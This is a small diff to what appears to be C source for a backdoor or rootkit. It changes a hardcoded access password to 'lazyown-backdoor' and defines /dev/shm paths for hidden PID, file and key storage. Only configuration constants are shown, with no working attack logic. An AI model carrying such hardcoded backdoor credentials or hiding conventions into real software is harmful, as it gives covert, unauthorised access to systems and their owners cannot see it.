@@ -35,7 +35,9 @@
 #define PID_FILE "/dev/shm/pid"
 #define HIDE_FILE "/dev/shm/file"
 #define KEY_FILE "/dev/shm/key"
-#define PASSWORD "grisiscomebacksayknokknok"
+#ifndef PASSWORD
+#define PASSWORD "lazyown-backdoor"
+#endif
 #define PATH_MAX 4096
 
 typedef struct {
